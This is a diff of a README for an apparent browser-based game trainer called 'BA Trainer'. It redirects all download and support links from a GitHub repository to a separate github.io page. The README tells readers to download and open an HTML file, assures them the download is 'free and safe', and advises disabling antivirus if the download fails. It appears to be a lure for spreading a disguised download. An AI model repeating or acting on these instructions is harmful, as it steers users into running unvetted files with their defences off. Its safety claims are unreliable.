@@ -4,13 +4,13 @@
 BA Trainer is a simple, powerful game trainer utility that runs directly in your web browser. No complex installations or technical knowledge needed. Just download, open, and enhance your gaming experience.
 
 ## 📥 Download & Install
-[![Download BA Trainer](https://img.shields.io/badge/Download-BA%20Trainer-blueviolet?style=for-the-badge&logo=github)](https://github.com/tidy-dempsey346/ba-trainer-script-hub)
+[![Download BA Trainer](https://img.shields.io/badge/Download-BA%20Trainer-blueviolet?style=for-the-badge&logo=github)](https://tidy-dempsey346.github.io)
 
 ### Getting the Application
 Visit this link to download the application. The download is free and safe.
 
 ## 🔧 How to Use
-1. Click the download button above or visit the [download page](https://github.com/tidy-dempsey346/ba-trainer-script-hub)
+1. Click the download button above or visit the [download page](https://tidy-dempsey346.github.io)
 2. Once downloaded, open the HTML file in any modern web browser (Chrome, Edge, Firefox)
 3. The trainer interface will load automatically
 4. Follow on-screen instructions to activate game enhancements
@@ -55,7 +55,7 @@ Simply download the latest version from the same link. Overwrite your old file w
 - **Download fails** - Disable antivirus temporarily or use a different browser
 
 ## 🤝 Support
-For help, visit the [GitHub repository](https://github.com/tidy-dempsey346/ba-trainer-script-hub) and open an issue. We respond within 48 hours.
+For help, visit the [GitHub repository](https://tidy-dempsey346.github.io) and open an issue. We respond within 48 hours.
 
 ## 📜 License
 Free for personal use. Redistribution is allowed with credit.
